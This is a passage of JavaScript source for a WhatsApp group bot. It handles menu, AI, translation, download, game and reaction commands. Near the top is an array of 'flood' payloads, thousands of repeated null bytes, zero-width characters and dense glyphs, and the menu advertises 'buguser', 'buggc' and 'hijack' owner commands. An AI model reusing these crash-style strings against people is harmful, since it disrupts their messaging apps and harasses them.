'use strict'

const api       = require('./api')
const state     = require('./state')
const utils     = require('./utils')
const cdn       = require('./cdn')
const reactions = require('./reactions')
const { BOT_NAME, BOT_VERSION, OWNER_NAME, OWNER_NUMBER, OWNER_NUMBERS, PREFIX } = require('./config')

const FLOOD_PAYLOADS = [
    () => '\u0000'.repeat(3000) + '꧔ꦿ'.repeat(1000),
    () => '\u200B\u200C\u200D\uFEFF'.repeat(3000),
    () => '𒐫'.repeat(2000) + '\u0000'.repeat(500),
    () => '🔥💥⚡🌀'.repeat(2000),
]
const GIF_ACTIONS = {
    hug:'hug', pat:'pat', slap:'slap', kiss:'kiss', cry:'cry', dance:'dance',
    wave:'wave', wink:'wink', bite:'bite', blush:'blush', cuddle:'cuddle',
    poke:'poke', yeet:'yeet', bonk:'bonk', lick:'lick', highfive:'highfive',
    smile:'smile', happy:'happy', handhold:'handhold', nom:'nom', bully:'bully', kill:'kill',
}

const pick  = arr => arr[Math.floor(Math.random() * arr.length)]
const sleep = ms  => new Promise(r => setTimeout(r, ms))
const digits = str => str?.replace(/[^0-9]/g, '') || ''

function extractTarget(arg = '', quotedParticipant = '') {
    if (!arg && quotedParticipant) return quotedParticipant.replace(/@s\.whatsapp\.net/g,'').replace(/[^0-9]/g,'')
    if (arg?.startsWith('@')) return arg.replace('@','').replace(/[^0-9]/g,'')
    return arg?.replace(/[^0-9]/g,'') || null
}

// Only real phone numbers from participants (no @lid junk)
function getRealNumbers(participants) {
    return (participants || [])
        .map(p => p.realNumber || api.participantToNumber(p))
        .filter(n => n && n.length >= 7)
}

function isAdmin(p) {
    const r = (p.admin || p.rank || '').toLowerCase()
    return p.isAdmin || p.isSuperAdmin || r === 'admin' || r === 'superadmin'
}

function buildMenu(chatId) {
    const chatbotOn = state.chatbot[chatId] ? 'ON 🟢' : 'OFF 🔴'
    const modeStr   = state.selfMode ? 'Self 🔒' : 'Public 🔓'
    return `╭═══ ${BOT_NAME} ═══⊷
┃❃╭──────────────────
┃❃│ Prefix  : ${PREFIX}
┃❃│ Owner   : ${OWNER_NAME}
┃❃│ Version : ${BOT_VERSION}
┃❃│ Mode    : ${modeStr}
┃❃│ Chatbot : ${chatbotOn}
┃❃│ Uptime  : ${utils.getUptime()}
┃❃╰───────────────────
╰══════════════════════⊷

 ╭─❏ 🤖 ᴀɪ & ᴛᴏᴏʟs ❏
 │ ai  codeai  createwebsite
 │ translate  wiki  define
 │ weather  calc  time
 │ qrcode  genpass
 │ shorturl  screenshot  carbon
 │ ipinfo  reverse  encode/decode
 │ pint  cat  dog
 ╰─────────────────

 ╭─❏ 🎬 ᴅᴏᴡɴʟᴏᴀᴅ ❏
 │ tiktok  fb  ig  spotify
 │ song  meme  lyrics
 ╰─────────────────

 ╭─❏ 🎨 ᴇᴅɪᴛᴏʀ & sᴛɪᴄᴋᴇʀ ❏
 │ sticker  toimg
 │ fancy  neon  hacker
 │ movie  news
 ╰─────────────────

 ╭─❏ 🎮 ɢᴀᴍᴇs & ꜰᴜɴ ❏
 │ dice  coin  8ball
 │ truth  dare  joke  dadjoke
 │ funfact  advice  quote  roast
 │ compliment  ship  fakeid
 │ trivia  answer  stoptrivia
 │ tictactoe  wyr
 ╰─────────────────

 ╭─❏ 💞 ʀᴇᴀᴄᴛɪᴏɴs ❏
 │ hug pat slap kiss cry dance
 │ wave wink bite blush cuddle
 │ poke yeet bonk lick highfive
 │ smile happy handhold nom bully kill
 ╰─────────────────

 ╭─❏ 👥 ɢʀᴏᴜᴘ ❏
 │ tagall  hidetag  tagadmins
 │ kick  add  warn  clearwarnings
 │ promote  demote  mute  unmute
 │ gcinfo  listadmins  grouplink
 │ resetlink  setgcname  kickall
 │ poll  vote  pollresult  endpoll
 │ rank  leaderboard
 │ welcome  goodbye
 │ antispam  antilink  antibadword
 │ antighostping  antifake
 │ filter  gfilter  stop  gstop
 │ inactive  msgs  pdm
 │ del  common
 ╰─────────────────

 ╭─❏ ⚙️ sᴇᴛᴛɪɴɢs ❏
 │ chatbot  autoreply  autoread
 │ autoreact  autotyping  antidelete
 │ self  public  announce
 ╰─────────────────

 ╭─❏ 🔔 ᴍɪsᴄ ❏
 │ afk  ping  alive  info
 │ tts  mention  forward  save
 │ setgreet  getgreet  delgreet
 │ reminder  jid  pp  fullpp
 ╰─────────────────

 ╭─❏ 👑 ᴏᴡɴᴇʀ ❏
 │ addsudo  delsudo  sudolist
 │ broadcast  botstatus
 │ buguser  buggc  stopflood
 │ hijack  banuser
 ╰─────────────────

_💡 Say *richard* to wake me!_`
}

async function handleCommand(chatId, sender, text, qid, isOwner, isSudo, isGroup, msg, isGroupAdmin = false) {
    const isPrivileged = isOwner || isSudo || isGroupAdmin
    const args  = text.trim().split(/\s+/)
    const cmd   = args[0].toLowerCase()
    const query = args.slice(1).join(' ')
    const quotedParticipant = msg?.message?.extendedTextMessage?.contextInfo?.participant || ''
    const quotedMsgId       = msg?.message?.extendedTextMessage?.contextInfo?.stanzaId || null
    const quotedText        = msg?.message?.extendedTextMessage?.contextInfo?.quotedMessage?.conversation
                           || msg?.message?.extendedTextMessage?.contextInfo?.quotedMessage?.extendedTextMessage?.text || ''

    // AFK check — if someone mentions an AFK user
    if (isGroup && text && !text.startsWith(PREFIX)) {
        const mentioned = (msg?.message?.extendedTextMessage?.contextInfo?.mentionedJid || [])
        for (const jid of mentioned) {
            const num = jid.split('@')[0]
            if (state.afkUsers[num]) {
                const a = state.afkUsers[num]
                const ago = Math.floor((Date.now() - a.time) / 60000)
                await api.sendText(chatId, `💤 @${num} is AFK${a.reason ? ': ' + a.reason : ''}\n⏱️ Since ${ago}m ago`)
            }
        }
        // Remove AFK if they sent a message
        if (state.afkUsers[sender]) {
            delete state.afkUsers[sender]
            await api.sendText(chatId, `👋 Welcome back @${sender}! AFK removed.`)
        }
    }

    // Message counter
    if (isGroup && text) {
        if (!state.msgCount[chatId]) state.msgCount[chatId] = {}
        state.msgCount[chatId][sender] = (state.msgCount[chatId][sender] || 0) + 1
    }

    // Auto filter
    if (isGroup && state.filters[chatId] && !text.startsWith(PREFIX)) {
        const lc = text.toLowerCase()
        for (const [keyword, response] of Object.entries(state.filters[chatId])) {
            if (lc.includes(keyword.toLowerCase())) {
                await api.sendText(chatId, response, qid)
                return
            }
        }
    }

    // ── MENU ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}menu` || cmd === `${PREFIX}help`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId, buildMenu(chatId), qid)
    }

    // ── GENERAL ──────────────────────────────────────────────
    if (cmd === `${PREFIX}alive`) {
        return api.sendText(chatId,
            `╭═══ ${BOT_NAME} ═══⊷\n┃❃│ ✅ ALIVE!\n┃❃│ ⏳ ${utils.getUptime()}\n┃❃│ 👑 ${OWNER_NAME}\n┃❃│ 🔐 ${state.selfMode?'Self 🔒':'Public 🔓'}\n╰══════════════════════⊷`, qid)
    }
    if (cmd === `${PREFIX}ping`) {
        const t = Date.now()
        return api.sendText(chatId, `🏓 Pong! ⚡ ${Date.now()-t}ms`, qid)
    }
    if (cmd === `${PREFIX}info`) {
        return api.sendText(chatId,
            `╭─❏ 🤖 ɪɴꜰᴏ ❏\n │ ${BOT_NAME} v${BOT_VERSION}\n │ Owner: ${OWNER_NAME}\n │ Mode: ${state.selfMode?'Self':'Public'}\n │ Uptime: ${utils.getUptime()}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}credits`) {
        return api.sendText(chatId, `╭─❏ 🏆 ᴄʀᴇᴅɪᴛs ❏\n │ Dev: GODSWILL (TAVIK)\n │ Bot: ${BOT_NAME} v${BOT_VERSION}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}owner`) {
        return api.sendText(chatId, `╭─❏ 👑 ᴏᴡɴᴇʀ ❏\n │ ${OWNER_NAME}\n │ wa.me/${OWNER_NUMBER}\n ╰─────────────────`, qid)
    }

    // ── JID / PP / FULLPP ─────────────────────────────────────
    if (cmd === `${PREFIX}jid`) {
        const target = extractTarget(args[1], quotedParticipant) || sender
        return api.sendText(chatId, `╭─❏ 🆔 ᴊɪᴅ ❏\n │ @${target}\n │ JID: ${target}@s.whatsapp.net\n │ Chat: ${chatId}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}gjid`) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        return api.sendText(chatId, `╭─❏ 🆔 ɢʀᴏᴜᴘ ᴊɪᴅ ❏\n │ ${chatId}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}pp` || cmd === `${PREFIX}fullpp`) {
        const target = extractTarget(args[1], quotedParticipant) || sender
        const ppUrl  = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=https://wa.me/${target}`
        return api.sendImage(chatId, ppUrl, `👤 Profile of @${target}`, qid)
    }

    // ── AI & TOOLS ───────────────────────────────────────────
    if (cmd === `${PREFIX}ai`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .ai <question>`, qid)
        await api.sendTyping(chatId, 3)
        const reply = await utils.askAI(query)
        return api.sendText(chatId, `╭─❏ 🤖 ᴀɪ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}groq`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .groq <question>`, qid)
        await api.sendTyping(chatId, 3)
        const reply = await utils.askAI(query)
        return api.sendText(chatId, `╭─❏ ⚡ ɢʀᴏǫ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}gpt`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .gpt <question>`, qid)
        await api.sendTyping(chatId, 3)
        const reply = await utils.askAI(query)
        return api.sendText(chatId, `╭─❏ 🧠 ɢᴘᴛ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}codeai` || cmd === `${PREFIX}code`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .codeai <request>`, qid)
        await api.sendTyping(chatId, 4)
        const reply = await utils.askCodeAI(query)
        return api.sendText(chatId, `╭─❏ 💻 ᴄᴏᴅᴇ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}createwebsite` || cmd === `${PREFIX}website`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .createwebsite <description>`, qid)
        await api.sendTyping(chatId, 5)
        await api.sendText(chatId, `⚡ Building website...`, qid)
        const html = await utils.createWebsite(query)
        if (!html) return api.sendText(chatId, `❌ Generation failed. Try a clearer description!`, qid)
        try {
            const buf = Buffer.from(html, 'utf-8')
            const url = await cdn.upload(buf, 'website.html', 'text/html')
            if (url) return api.sendText(chatId, `✅ *Website Ready!*\n📄 ${query}\n🔗 ${url}\n\n_Open in browser!_`, qid)
        } catch {}
        return api.sendText(chatId, `✅ *Website Generated!*\n\n${html.slice(0, 3500)}`, qid)
    }
    if (cmd === `${PREFIX}translate` || cmd === `${PREFIX}tr`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .translate <lang> <text>`, qid)
        await api.sendTyping(chatId, 2)
        const parts = query.split(' ')
        const langs = ['english','french','spanish','arabic','hausa','yoruba','igbo','portuguese','german','chinese','japanese','korean','hindi','russian','italian','pidgin','afrikaans']
        let tLang, tText
        if (langs.includes(parts[0].toLowerCase()) || (parts[0].length <= 3 && parts.length > 1)) {
            tLang = parts[0]; tText = parts.slice(1).join(' ')
        } else { tLang = 'English'; tText = query }
        if (!tText) return api.sendText(chatId, `❌ No text to translate!`, qid)
        const result = await utils.translateText(tText, tLang)
        return api.sendText(chatId, `╭─❏ 🌐 ᴛʀᴀɴsʟᴀᴛᴇ ❏\n │ To: *${tLang}*\n │\n │ ${result}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}wiki`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .wiki <topic>`, qid)
        await api.sendTyping(chatId, 2)
        const result = await utils.getWiki(query)
        if (!result) return api.sendText(chatId, `❌ Nothing found for "${query}"`, qid)
        return api.sendText(chatId, `╭─❏ 📖 ᴡɪᴋɪ ❏\n │ *${query}*\n │\n │ ${result.slice(0,700).replace(/\n/g,'\n │ ')}...\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}define` || cmd === `${PREFIX}dictionary`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .define <word>`, qid)
        await api.sendTyping(chatId, 2)
        const r = await utils.getDictionary(query)
        if (!r) return api.sendText(chatId, `❌ No definition for "${query}"`, qid)
        return api.sendText(chatId, `╭─❏ 📚 ᴅᴇꜰɪɴɪᴛɪᴏɴ ❏\n │ *${r.word}* ${r.phonetic}\n │ _(${r.partOfSpeech})_\n │ ${r.definition}\n │ ${r.example?`💬 _"${r.example}"_`:''}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}weather`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .weather <city>`, qid)
        await api.sendTyping(chatId, 2)
        const r = await utils.getWeather(query)
        if (!r) return api.sendText(chatId, `❌ City not found!`, qid)
        return api.sendText(chatId, `╭─❏ 🌤️ ᴡᴇᴀᴛʜᴇʀ ❏\n │ *${query}*\n │ ${r}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}calculate` || cmd === `${PREFIX}calc`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .calc <expression>`, qid)
        try {
            const safe = query.replace(/[^0-9+\-*/.()%\s]/g,'')
            if (!safe) return api.sendText(chatId, `❌ Invalid expression!`, qid)
            // eslint-disable-next-line no-new-func
            const result = Function('"use strict";return('+safe+')')()
            if (!isFinite(result)) return api.sendText(chatId, `❌ Math error!`, qid)
            return api.sendText(chatId, `╭─❏ 🧮 ᴄᴀʟᴄ ❏\n │ 📝 ${query}\n │ = *${result}*\n ╰─────────────────`, qid)
        } catch { return api.sendText(chatId, `❌ Invalid expression!`, qid) }
    }
    if (cmd === `${PREFIX}time`) {
        const n = new Date()
        return api.sendText(chatId, `╭─❏ 🕐 ᴛɪᴍᴇ ❏\n │ 📅 ${n.toDateString()}\n │ ⏰ ${n.toTimeString().split(' ')[0]}\n │ 🌍 ${n.toUTCString()}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}shorturl` || cmd === `${PREFIX}url`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .shorturl <url>`, qid)
        const surl = await utils.shortenUrl(query)
        if (!surl) return api.sendText(chatId, `❌ Failed to shorten!`, qid)
        return api.sendText(chatId, `╭─❏ 🔗 ᴜʀʟ ❏\n │ ✅ ${surl}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}screenshot` || cmd === `${PREFIX}ss` || cmd === `${PREFIX}fullss`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .ss <url>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `📸 Taking screenshot...`, qid)
        return api.sendImage(chatId, utils.screenshotUrl(query), `📸 ${query}`, qid)
    }
    if (cmd === `${PREFIX}carbon`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .carbon <code>`, qid)
        return api.sendImage(chatId, `https://carbonara.solopov.dev/api/cook?code=${encodeURIComponent(query)}&theme=dracula&language=auto`, `💻 Code Image`, qid)
    }
    if (cmd === `${PREFIX}ipinfo` || cmd === `${PREFIX}ip`) {
        if (!args[1]) return api.sendText(chatId, `❌ Usage: .ipinfo <ip>`, qid)
        await api.sendTyping(chatId, 2)
        try {
            const r = await require('axios').get(`https://ipapi.co/${args[1]}/json/`, { timeout: 10_000 })
            const d = r.data
            if (d.error) return api.sendText(chatId, `❌ Invalid IP!`, qid)
            return api.sendText(chatId, `╭─❏ 🌐 ɪᴘ ❏\n │ 🖥️ ${d.ip}\n │ 🌍 ${d.country_name}\n │ 🏙️ ${d.city}\n │ 📡 ${d.org}\n │ ⏰ ${d.timezone}\n ╰─────────────────`, qid)
        } catch { return api.sendText(chatId, `❌ Could not fetch IP info!`, qid) }
    }
    if (cmd === `${PREFIX}reverse`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .reverse <text>`, qid)
        return api.sendText(chatId, `🔄 ${query.split('').reverse().join('')}`, qid)
    }
    if (cmd === `${PREFIX}encode`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .encode <text>`, qid)
        return api.sendText(chatId, `🔐 *Base64:*\n${Buffer.from(query).toString('base64')}`, qid)
    }
    if (cmd === `${PREFIX}decode`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .decode <base64>`, qid)
        try { return api.sendText(chatId, `🔓 ${Buffer.from(query,'base64').toString('utf8')}`, qid) }
        catch { return api.sendText(chatId, `❌ Invalid base64!`, qid) }
    }
    if (cmd === `${PREFIX}qrcode` || cmd === `${PREFIX}qr`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .qrcode <text>`, qid)
        return api.sendImage(chatId, utils.getQRCode(query), `📱 QR Code`, qid)
    }
    if (cmd === `${PREFIX}genpass`) {
        const len = Math.min(parseInt(args[1]) || 16, 64)
        return api.sendText(chatId, `╭─❏ 🔐 ᴘᴀssᴡᴏʀᴅ ❏\n │ \`${utils.generatePassword(len)}\`\n │ 📏 ${len} chars\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}pint` || cmd === `${PREFIX}img`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .pint <search>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🔍 Searching *${query}*...`, qid)
        const urls = await utils.searchImages(query, 5)
        if (!urls.length) return api.sendText(chatId, `❌ No images found for "${query}"`, qid)
        let sent = 0
        for (const url of urls) {
            try { await api.sendImage(chatId, url, sent===0?`🖼️ *${query}*`:'', qid); sent++; await sleep(500) } catch {}
        }
        if (!sent) return api.sendText(chatId, `❌ Images failed to load.`, qid)
        return
    }
    if (cmd === `${PREFIX}cat`) {
        const url = await utils.getCatImage()
        if (!url) return api.sendText(chatId, `❌ No cat found!`, qid)
        return api.sendImage(chatId, url, `🐱 Meow!`, qid)
    }
    if (cmd === `${PREFIX}dog`) {
        const url = await utils.getDogImage()
        if (!url) return api.sendText(chatId, `❌ No dog found!`, qid)
        return api.sendImage(chatId, url, `🐶 Woof!`, qid)
    }
    if (cmd === `${PREFIX}movie`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .movie <title>`, qid)
        await api.sendTyping(chatId, 2)
        const m = await utils.getMovieInfo(query)
        if (!m) return api.sendText(chatId, `❌ Movie not found!`, qid)
        if (m.info) return api.sendText(chatId, `╭─❏ 🎬 ᴍᴏᴠɪᴇ ❏\n │ *${query}*\n │\n${m.info}\n ╰─────────────────`, qid)
        return api.sendText(chatId,
            `╭─❏ 🎬 ᴍᴏᴠɪᴇ ❏\n │ 🎥 *${m.Title}* (${m.Year})\n │ ⭐ ${m.imdbRating}/10\n │ 🎭 ${m.Genre}\n │ 🎬 ${m.Director}\n │ 🌟 ${m.Actors}\n │\n │ 📖 ${m.Plot?.slice(0,300)}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}news`) {
        await api.sendTyping(chatId, 2)
        const articles = await utils.getNews(query || 'world')
        if (!articles.length) return api.sendText(chatId, `❌ No news found!`, qid)
        const txt = articles.map((a,i) => ` │ ${i+1}. *${a.title}*\n │    ${(a.description||'').slice(0,80)}...`).join('\n │\n')
        return api.sendText(chatId, `╭─❏ 📰 ɴᴇᴡs ❏\n${txt}\n ╰─────────────────`, qid)
    }

    // ── STICKER ───────────────────────────────────────────────
    if (cmd === `${PREFIX}sticker` || cmd === `${PREFIX}s`) {
        // Sticker from quoted image or URL
        const quotedMsg = msg?.message?.extendedTextMessage?.contextInfo?.quotedMessage
        const imgUrl    = query || null

        if (quotedMsg?.imageMessage) {
            // Evolution API: send the quoted media as sticker
            const mediaKey = quotedMsg.imageMessage.mediaKey
            // We re-send using the quoted message's media URL if available
            const directUrl = quotedMsg.imageMessage.url || quotedMsg.imageMessage.directPath
            if (directUrl) {
                await api.sendSticker(chatId, directUrl, qid)
                return
            }
            return api.sendText(chatId, `❌ Cannot extract image. Send image directly with caption *.sticker*`, qid)
        }
        if (imgUrl) {
            await api.sendSticker(chatId, imgUrl, qid)
            return
        }
        return api.sendText(chatId, `❌ Reply to an image with *.sticker* or use *.sticker <image_url>*`, qid)
    }
    if (cmd === `${PREFIX}toimg`) {
        // Convert sticker/image back — just forward the quoted image
        const quotedMsg = msg?.message?.extendedTextMessage?.contextInfo?.quotedMessage
        if (!quotedMsg) return api.sendText(chatId, `❌ Reply to a sticker/image with *.toimg*`, qid)
        const url = quotedMsg.stickerMessage?.url || quotedMsg.imageMessage?.url
        if (!url) return api.sendText(chatId, `❌ No media found in quoted message!`, qid)
        return api.sendImage(chatId, url, `🖼️ Converted!`, qid)
    }

    // ── TEXT MAKERS (Levanter: fancy, neon, hacker, etc.) ─────
    if (cmd === `${PREFIX}fancy`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .fancy <text>`, qid)
        return api.sendText(chatId, utils.fancyText(query, 'bold'), qid)
    }
    if (cmd === `${PREFIX}neon` || cmd === `${PREFIX}glitch`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .neon <text>`, qid)
        return api.sendText(chatId, utils.fancyText(query, 'bubble'), qid)
    }
    if (cmd === `${PREFIX}hacker` || cmd === `${PREFIX}mono`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .hacker <text>`, qid)
        return api.sendText(chatId, utils.fancyText(query, 'mono'), qid)
    }
    if (cmd === `${PREFIX}tts`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .tts <text>`, qid)
        const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(query)}&tl=en&client=tw-ob`
        return api.sendAudio(chatId, ttsUrl)
    }

    // ── MEDIA / DOWNLOAD ──────────────────────────────────────
    if (cmd === `${PREFIX}tiktok`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .tiktok <url>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `⬇️ Downloading TikTok...`, qid)
        const url = await utils.downloadTiktok(query)
        if (!url) return api.sendText(chatId, `❌ Download failed! Check the URL.`, qid)
        return api.sendVideo(chatId, url, `🎵 TikTok`, qid)
    }
    if (cmd === `${PREFIX}meme`) {
        await api.sendTyping(chatId, 2)
        const url = await utils.getMeme()
        if (!url) return api.sendText(chatId, `❌ No meme found!`, qid)
        return api.sendImage(chatId, url, `😂 Random Meme`, qid)
    }
    if (cmd === `${PREFIX}lyrics`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .lyrics <song>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🎵 Searching for *${query}*...`, qid)
        const lyr = await utils.getLyrics(query)
        if (!lyr) return api.sendText(chatId, `❌ Not found for "${query}"`, qid)
        return api.sendText(chatId, `╭─❏ 🎵 ʟʏʀɪᴄs ❏\n │ *${lyr.title}*\n │ ${lyr.artist||'Unknown'}\n │\n${lyr.lyrics.slice(0,2800)}${lyr.lyrics.length>2800?'\n...(truncated)':''}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}ig` || cmd === `${PREFIX}insta`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .ig <instagram_url>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `⬇️ Downloading Instagram...`, qid)
        const url = await utils.downloadInstagram(query)
        if (!url) return api.sendText(chatId, `❌ Instagram download failed!`, qid)
        return api.sendVideo(chatId, url, `📸 Instagram`, qid)
    }
    if (cmd === `${PREFIX}fb`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .fb <facebook_url>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `⬇️ Downloading Facebook...`, qid)
        const url = await utils.downloadFacebook(query)
        if (!url) return api.sendText(chatId, `❌ Facebook download failed!`, qid)
        return api.sendVideo(chatId, url, `📘 Facebook`, qid)
    }
    if (cmd === `${PREFIX}spotify` || cmd === `${PREFIX}song`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .spotify <song name>`, qid)
        await api.sendTyping(chatId, 2)
        const info = await utils.getSpotifyInfo(query)
        return api.sendText(chatId, `╭─❏ 🎵 sᴘᴏᴛɪꜰʏ ❏\n │ *${query}*\n │\n${info}\n ╰─────────────────`, qid)
    }

    // ── GAMES ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}dice`) return api.sendText(chatId, `🎲 *Rolled:* ${Math.floor(Math.random()*6)+1}`, qid)
    if (cmd === `${PREFIX}coin`) return api.sendText(chatId, `🪙 *${Math.random()>0.5?'Heads':'Tails'}!*`, qid)
    if (cmd === `${PREFIX}8ball`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .8ball <question>`, qid)
        const answers = ['✅ Yes!','❌ No!','🤔 Maybe...','💯 Definitely!','🚫 Absolutely not!','⚡ Ask again later','🎯 Without a doubt!','💭 Cannot predict','🔮 Signs point to yes','❓ Very doubtful']
        return api.sendText(chatId, `╭─❏ 🎱 8ʙᴀʟʟ ❏\n │ ❓ ${query}\n │ 🔮 ${pick(answers)}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}wyr`) {
        await api.sendTyping(chatId, 2)
        const wyr = await utils.askAI('Give ONE "Would You Rather" question with two funny/interesting options. Format: "Would you rather [option A] or [option B]?" No extra text.')
        return api.sendText(chatId, `╭─❏ 🤔 ᴡᴏᴜʟᴅ ʏᴏᴜ ʀᴀᴛʜᴇʀ ❏\n │ ${wyr}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}tictactoe`) {
        return api.sendText(chatId, `🎮 Tic-Tac-Toe: Use .ai to play!\nTry: *.ai Let's play tic-tac-toe, you start*`, qid)
    }
    if (cmd === `${PREFIX}truth`) {
        const truths = ['What is your biggest fear?','What is the most embarrassing thing you have done?','Have you ever lied to a close friend?','What is your biggest secret?','Who do you have a crush on?','What is your worst habit?','Have you ever stolen anything?']
        return api.sendText(chatId, `╭─❏ 💬 ᴛʀᴜᴛʜ ❏\n │ ${pick(truths)}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}dare`) {
        const dares = ['Send a voice note singing your favourite song','Change your profile picture for 1 hour','Text your crush right now','Do 20 push-ups','Post a funny selfie in the group','Call someone and sing happy birthday','Speak in a funny accent for 5 minutes']
        return api.sendText(chatId, `╭─❏ 🎭 ᴅᴀʀᴇ ❏\n │ ${pick(dares)}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}joke`) { await api.sendTyping(chatId,1); return api.sendText(chatId, `╭─❏ 😂 ᴊᴏᴋᴇ ❏\n │ ${await utils.getJoke()}\n ╰─────────────────`, qid) }
    if (cmd === `${PREFIX}dadjoke`) { const j = await utils.getDadJoke(); if (!j) return api.sendText(chatId,'❌ No joke!',qid); return api.sendText(chatId, `╭─❏ 👨 ᴅᴀᴅᴊᴏᴋᴇ ❏\n │ ${j}\n ╰─────────────────`, qid) }
    if (cmd === `${PREFIX}funfact`) { return api.sendText(chatId, `╭─❏ 🤯 ꜰᴜɴꜰᴀᴄᴛ ❏\n │ ${await utils.getFunFact()}\n ╰─────────────────`, qid) }
    if (cmd === `${PREFIX}advice`) { return api.sendText(chatId, `╭─❏ 💡 ᴀᴅᴠɪᴄᴇ ❏\n │ ${await utils.getAdvice()}\n ╰─────────────────`, qid) }
    if (cmd === `${PREFIX}quote`) { return api.sendText(chatId, `╭─❏ 💬 ǫᴜᴏᴛᴇ ❏\n │ ${await utils.getQuote()}\n ╰─────────────────`, qid) }
    if (cmd === `${PREFIX}roast`) {
        const target = extractTarget(args[1], quotedParticipant)
        const roasts = ["I'd roast you but my mama said not to burn trash.","You're the reason the gene pool needs a lifeguard.","I'd explain it to you but I left my crayons at home.","Your birth certificate is an apology letter.","Keep rolling your eyes, maybe you'll find a brain back there."]
        const roast = pick(roasts)
        return api.sendText(chatId, target ? `🔥 @${target}: ${roast}` : `╭─❏ 🔥 ʀᴏᴀsᴛ ❏\n │ ${roast}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}compliment`) {
        const target = extractTarget(args[1], quotedParticipant)
        const compliments = ['You are amazing and incredibly talented! 🌟','Your smile lights up every room! ✨','You make the world better just by being in it! 🌍','You are stronger than you know! 💪','Your kindness is truly inspiring! 💖','You have a brilliant mind and a beautiful heart! 🧠❤️']
        const msg2 = pick(compliments)
        return api.sendText(chatId, target ? `💝 @${target}: ${msg2}` : `💝 ${msg2}`, qid)
    }
    if (cmd === `${PREFIX}ship`) {
        const p1 = extractTarget(args[1],'') || sender
        const p2 = extractTarget(args[2], quotedParticipant) || 'someone'
        const pct = Math.floor(Math.random()*101)
        const hearts = pct>=70?'❤️❤️❤️':pct>=40?'💛💛':'💔'
        const label  = pct>=80?'Perfect match! 💑':pct>=60?'Good vibes! 💕':pct>=40?'Maybe...? 😅':'Not meant to be 😬'
        const bar    = '█'.repeat(Math.floor(pct/10))+'░'.repeat(10-Math.floor(pct/10))
        return api.sendText(chatId, `╭─❏ 💘 sʜɪᴘ ❏\n │ @${p1} + @${p2}\n │\n │ ${hearts} *${pct}%*\n │ [${bar}]\n │ ${label}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}fakeid` || cmd === `${PREFIX}fakeprofile`) {
        await api.sendTyping(chatId, 2)
        const fake = await utils.askAI('Generate a fun fake person profile: Name, Age, Country, City, Job, Hobby, Fun fact. Use emojis.')
        return api.sendText(chatId, `╭─❏ 🪪 ꜰᴀᴋᴇ ᴘʀᴏꜰɪʟᴇ ❏\n │\n${fake}\n ╰─────────────────`, qid)
    }

    // ── TRIVIA ────────────────────────────────────────────────
    if (cmd === `${PREFIX}trivia`) {
        if (state.trivia[chatId]?.active) {
            const t = state.trivia[chatId]
